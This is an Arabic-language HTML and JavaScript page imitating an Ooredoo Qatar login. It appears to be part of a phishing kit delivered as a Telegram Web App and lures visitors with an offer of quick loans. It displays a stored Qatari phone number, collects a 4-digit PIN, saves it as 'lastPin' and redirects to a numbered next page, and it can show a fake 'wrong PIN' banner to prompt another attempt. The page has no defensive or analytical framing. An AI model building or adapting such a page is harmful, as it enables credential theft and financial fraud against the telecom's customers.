<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ooredoo قطر - تسجيل الدخول</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --ooredoo-red: #e60000;
            --ooredoo-gradient: linear-gradient(180deg, #ff1a1a 0%, #cc0000 100%);
            --bg-color: #ffffff;
            --text-dark: #333333;
            --text-muted: #777777;
            --border-red: #e60000;
            --btn-disabled-bg: #e2e2e2;
            --btn-disabled-text: #ffffff;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body { 
            background-color: var(--bg-color); 
            margin: 0; 
            padding: 0;
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
        }

        .header-box { 
            width: 100%; 
            background: var(--ooredoo-gradient); 
            padding: 30px 20px 25px; 
            color: white; 
            text-align: center; 
        }

        .header-title {
            font-size: 30px;
            font-weight: 800;
            margin: 0;
            color: white;
        }

        .sub-header-text { 
            font-size: 14px; 
            margin-top: 6px; 
            font-weight: 500;
            color: #ffffff;
        }

        .main-content { 
            width: 90%; 
            max-width: 400px; 
            margin: 25px auto 0; 
            text-align: center; 
            flex-grow: 1; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h2 { 
            color: #555555; 
            font-size: 22px; 
            margin: 10px 0 25px; 
            font-weight: 600; 
        }

        .phone-display {
            width: 100%;
            border: 1.5px solid var(--border-red);
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
            font-size: 18px;
            font-weight: 700;
            color: #222222;
            background-color: #ffffff;
            direction: ltr;
        }

        .pin-label { 
            color: var(--text-muted); 
            margin-bottom: 16px; 
            font-size: 14px; 
            font-weight: 500; 
        }

        .pin-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 8px;
        }

        .pin-input-group { 
            display: flex; 
            gap: 12px; 
            direction: ltr;
        }

        .pin-box {
            width: 52px;
            height: 52px;
            border: 1.5px solid var(--border-red);
            border-radius: 12px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            outline: none;
            background-color: #ffffff;
        }

        .toggle-eye { 
            position: absolute;
            left: 0;
            cursor: pointer; 
            font-size: 20px; 
            user-select: none;
        }

        .forgot-pin {
            color: var(--text-muted);
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 35px;
            display: inline-block;
        }

        .btn-submit {
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .btn-submit.active {
            background-color: var(--ooredoo-red);
            color: #ffffff;
            cursor: pointer;
        }

        .error-banner {
            background-color: #fde8e8;
            color: #e74c3c;
            border: 1px solid #f8b4b4;
            padding: 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 15px;
            width: 100%;
            display: none;
        }

        .footer-box { 
            width: 100%; 
            background: var(--ooredoo-gradient); 
            padding: 35px 20px 20px; 
            color: white; 
            text-align: center; 
            border-top-left-radius: 50% 30px; 
            border-top-right-radius: 50% 30px; 
            margin-top: auto;
        }

        .terms-text { 
            font-size: 11px; 
            margin-top: 15px; 
            padding: 0 20px; 
            line-height: 1.4; 
            color: #ffffff;
        }
    </style>
</head>

<body>

<div class="header-box">
    <div class="header-title">Ooredoo Qatar 🇶🇦</div>
    <div class="sub-header-text">قروض سريعة وبسيطة</div>
</div>

<div class="main-content">
    <h2>تسجيل الدخول</h2>

    <div id="errorDisplay" class="error-banner"></div>

    <div class="phone-display">
        <span>+974</span>
        <span id="displayPhone">--</span>
        <span>🇶🇦</span>
    </div>

    <p class="pin-label">أدخل رمز الـ PIN الخاص بك</p>

    <div class="pin-wrapper">
        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        </div>
    </div>

    <a href="#" class="forgot-pin">هل نسيت رمز الـ PIN؟</a>

    <button id="loginBtn" class="btn-submit" disabled>تسجيل الدخول</button>
</div>

<div class="footer-box">
    <div class="header-title">Ooredoo Qatar</div>
    <p class="terms-text">بتسجيل الدخول، فإنك توافق على <u>الشروط والأحكام العامة</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "33000000";
    displayPhone.textContent = savedPhone;

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.innerText = "❌ رمز PIN غير صحيح، يرجى المحاولة مرة أخرى.";
        errorDisplay.style.display = "block";
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value.length === 1);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    eye.addEventListener('click', () => {
        const isPassword = pinBoxes[0].type === "password";
        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
    });

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);

        errorDisplay.style.display = "none";
        window.location.href = "/page7";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
